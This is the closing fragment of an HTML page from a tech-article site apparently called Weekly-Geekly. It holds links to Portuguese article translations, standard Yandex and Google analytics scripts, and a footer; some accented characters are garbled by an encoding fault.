<li><a href="../pt450132/index.html">N√£o foi poss√≠vel explicar a m√¥nada</a></li>
<li><a href="../pt450134/index.html">A segunda vida de an√©is e broches: como recriar rapidamente j√≥ias usando a tecnologia 3D</a></li>
<li><a href="../pt450136/index.html">Quando as paredes n√£o s√£o suficientes. Como proteger pontos de extremidade</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>